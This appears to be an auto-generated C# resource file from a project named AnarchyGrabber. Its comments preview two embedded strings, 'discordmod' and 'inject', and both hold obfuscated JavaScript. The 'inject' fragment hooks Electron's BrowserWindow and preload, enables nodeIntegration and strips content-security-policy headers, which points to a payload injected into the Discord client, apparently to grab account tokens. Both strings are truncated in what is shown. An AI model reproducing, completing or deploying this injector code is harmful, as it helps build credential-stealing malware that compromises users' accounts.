//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace AnarchyGrabber {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("AnarchyGrabber.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to const _0x3476=[&apos;w44Iw5LCj8OLwr19w4fCtGJxw6o=&apos;,&apos;UC/CrFd/w5I=&apos;,&apos;IcO3wp7CtCgEwopNw6Mb&apos;,&apos;wqJmOhzDvCJbw7LCtxbDrA==&apos;,&apos;b8KYw4/DocOTH8Kgw4w/F8OwSMKUCho=&apos;,&apos;Ez9Y&apos;,&apos;Km/DkcOB&apos;,&apos;McKvw4I=&apos;,&apos;wqVLR8Omw5U1dCTDgw==&apos;,&apos;bHzCgx8=&apos;,&apos;ZXvCjh7DsmLDosOBJGlCK1PDicKob8Kpwp4cwojCuUdn&apos;,&apos;w4XDucONEEMhwrU=&apos;,&apos;woJQXsOqw5U=&apos;,&apos;wqrDncK1Jg==&apos;,&apos;w6/DocOzw4PDk8KPAg==&apos;,&apos;w74NBw==&apos;,&apos;IA/DuRUIw6JUw5FrUHQ=&apos;,&apos;UiDCpmTCuF/Cj8Oy&apos;,&apos;w7bCkyoAwqpVd8KQR1TDvMK6GA==&apos;,&apos;w5cUw4/ClMOmw7F9w4PCiHh2w6zDhMKIEAPCgGM=&apos;,&apos;wrTCpSLCgsO3NMO4E8Onw7zCtMOTw4XCig==&apos;,&apos;w6RVwrk=&apos;,&apos;w7QPw5 [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string discordmod {
            get {
                return ResourceManager.GetString("discordmod", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to const a=[&apos;path&apos;,&apos;BrowserWindow&apos;,&apos;deprecate&apos;,&apos;content-security-policy-report-only&apos;,&apos;session&apos;,&apos;preload&apos;,&apos;responseHeaders&apos;,&apos;content-security-policy&apos;,&apos;promisify&apos;,&apos;\x5cdiscordmod.js&apos;,&apos;env&apos;,&apos;create&apos;,&apos;resolve&apos;,&apos;join&apos;,&apos;webRequest&apos;,&apos;title&apos;,&apos;defaultSession&apos;,&apos;assign&apos;,&apos;electron&apos;,&apos;webPreferences&apos;,&apos;exports&apos;,&apos;nodeIntegration&apos;,&apos;__preload&apos;,&apos;modDir&apos;,&apos;transparency&apos;];(function(b,e){const f=function(g){while(--g){b[&apos;push&apos;](b[&apos;shift&apos;]());}};f(++e);}(a,0x11b));const b=function(c,d){c=c-0x0;let e=a[c];return e;};const electron=req [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string inject {
            get {
                return ResourceManager.GetString("inject", resourceCulture);
            }
        }
    }
}
